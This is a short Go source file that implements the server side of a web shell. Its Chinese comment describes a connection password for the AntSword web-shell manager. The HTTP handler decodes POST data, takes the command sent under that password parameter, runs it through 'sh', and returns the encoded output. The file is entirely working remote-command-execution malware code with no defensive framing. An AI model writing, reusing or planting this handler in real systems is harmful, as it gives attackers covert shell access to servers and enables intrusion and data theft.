package server

import (
	"net/http"
	"net/url"

	"github.com/Wd0g/Gos/lib/common"
)

type Cmd struct {
	Pwd     string // 蚁剑连接密码
	Decoder func(url.Values) url.Values
	Encoder func(string) string
}

func (c Cmd) ServeHTTP(w http.ResponseWriter, req *http.Request) {
	req.ParseForm()
	req.PostForm = c.Decoder(req.PostForm)
	// 检测参数
	args := req.PostFormValue(c.Pwd)
	if args == "" {
		return
	}

	res, _ := common.Shell(args, "sh")
	w.Write([]byte(c.Encoder(res)))
	return
}
